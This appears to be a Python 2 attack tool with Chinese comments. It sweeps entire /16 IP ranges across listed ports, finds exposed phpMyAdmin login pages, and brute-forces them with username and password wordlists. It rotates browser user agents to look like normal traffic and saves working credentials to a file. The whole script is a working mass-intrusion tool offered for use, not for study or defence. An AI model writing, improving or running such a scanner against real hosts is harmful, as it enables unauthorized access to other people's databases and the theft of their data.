# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
import socket
import re
import requests
import time
import random
import threadpool
import threading
reload(sys)
sys.setdefaultencoding('utf-8')
global listport  #端口
global user
global passwd
users=[]
with open('user.txt','r') as u:
    for x in u:
        users.append(x.replace('\n',''))
passwd=[]
with open('password.txt','r')as ps:
    for x in ps:
        passwd.append(x.replace('\n',''))
listport=[]
with open('port.txt','r')as p:
    for x in p:
        listport.append(x.replace('\n',''))

set_thread = input(unicode('设置扫描的线程数量(set threads):','utf-8').encode('gbk'))
timeout=6
socket.setdefaulttimeout(timeout)
#传递生成账号密码和ip端口

headerss = [
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
            "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24" ]



def scan_live(ip):
    try:
        for scanport in listport:
            print '[*] Connect ' + ip + ':' + str(scanport)
            s = socket.socket()
            s.connect((str(ip), int(scanport)))
            s.send('langziyanqing \n')
            cc = s.recv(1024)
            if 'not allowed to' not in cc:
                s.close()
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                url = 'http://' + str(ip) +':' + str(scanport) + '/phpmyadmin/index.php'
                try:
                    req = requests.get(url = url,headers=headers,timeout=5)
                    if 'Documentation.html' in req.content:
                        print 'Start burte....'
                        for us in users:
                            for ps in passwd:
                                user = str(us)
                                password = str(ps)
                                data = {'pma_username': str(user), 'pma_password': str(password)}
                                try:
                                    UA = random.choice(headerss)
                                    headers = {'User-Agent': UA}
                                    req1 = requests.post(url=url, data=data, headers=headers, timeout=10)
                                    if 'mainFrameset' in req1.content:
                                        print unicode('爆破成功', 'utf-8')
                                        with open('success.txt', 'a+')as a:
                                            a.write(url + '|' + user + '|' + password + '\n')
                                        return user, password
                                    else:
                                        print req1.status_code
                                        pass
                                except Exception, e:
                                    print e
                    else:
                        pass
                except Exception,e:
                    print unicode("当前页面非phpadmin",'utf-8')
            else:
                pass
    except Exception, e:
        print e
    finally:
        s.close()


while 1:
    #传递参数生成IP
    listip=[]
    with open('c.txt','r')as c:
        for x in c:
            listip.append(x.replace('\n',''))
    c_1 = listip[0]
    c_1_1 = c_1.split('.')[0]
    c_1_2 = c_1.split('.')[1]
    c_1_3 = c_1_1 + '.' + c_1_2 + '.'
    # 遍历循环
    iplist0 = []
    for i in range(0, 255):
        c_1_4 = c_1_3 + str(i) + '.'
        iplist0.append(c_1_4)
    list1 = []
    for x in iplist0:
        for i in range(0, 255):
            ip = x + str(i)
            list1.append(ip)
    # 删除第一个ip段 并且重新写入本地
    listip.remove(c_1)
    with open('c.txt', 'w+')as w:
        for x in listip:
            w.write(x + '\n')
    # for x in list2:
    #     print x
    #     scan_live(x)
    time.sleep(3)
    time.sleep(2)
    pool = threadpool.ThreadPool(int(set_thread))
    requests = threadpool.makeRequests(scan_live, list1)
    # for i in requests:print i
    [pool.putRequest(req) for req in requests]
    pool.wait()









# 在ip段选择第一个ip生产ip
# c_1 = listip[0]
# print c_1
# list1=[]
# list2=[]
# with open('c.txt','r')as f:
#     for x in f:
#         x0 = x.split('|')[0]
#         x1 = x.split('|')[1]
#         #print x0,x1
#         x0_0 = int(x0.split('.')[0])
#         x0_1=int(x0.split('.')[1])
#         x0_2 = int(x0.split('.')[2])
#         x0_3 = int(x0.split('.')[3])
#         x1_0 = int(x1.split('.')[0])
#         x1_1 = int(x1.split('.')[1])
#         x1_2 = int(x1.split('.')[2])
#         x1_3 = int(x1.split('.')[3])
#         if x0_1==x1_1:
#             xx1 = str(x0_0) + '.' + str(x0_1)
#             if x0_2 == x1_2:
#                 xx2 = str(xx1) + '.' + str(x0_2)
#                 if x0_3 == x1_3:
#                     xxxxx = str(xx2)+ '.' + str(x0_3)
#                     list2.append(xxxxx)
#                 else:
#                     for xxx in range(x0_3,x1_3):
#                         xxxxx = str(xx2) + '.' + str(xxx)
#                         list2.append(xxxxx)
#             else:
#                 for x in range(x0_2,x1_2):
#                     xx2 = str(xx1) + '.' + str(x)
#                     if x0_3 == x1_3:
#                         xxxxx = str(xx2) + '.' + str(x0_3)
#                         list2.append(xxxxx)
#                     else:
#                         for xxx in range(x0_3, 255):
#                             xxxxx = str(xx2) + '.' + str(xxx)
#                             list2.append(xxxxx)
#         else:
#             for x in range(x0_1,x1_1):
#                 xx1 = str(x0_0) + '.' + str(x)
#                 if x0_2 == x1_2:
#                     xx2 = str(xx1) + '.' + str(x0_2)
#                     if x0_3 == x1_3:
#                         xxxxx = str(xx2) + '.' + str(x0_3)
#                         list2.append(xxxxx)
#                     else:
#                         for xxx in range(x0_3, 255):
#                             xxxxx = str(xx2) + '.' + str(xxx)
#                             list2.append(xxxxx)
#                 else:
#                     for x in range(x0_2, x1_2):
#                         xx2 = str(xx1) + '.' + str(x)
#                         if x0_3 == x1_3:
#                             xxxxx = str(xx2) + '.' + str(x0_3)
#                             list2.append(xxxxx)
#                         else:
#                             for xxx in range(x0_3, 255):
#                                 xxxxx = str(xx2) + '.' + str(xxx)
#                                 list2.append(xxxxx)




#








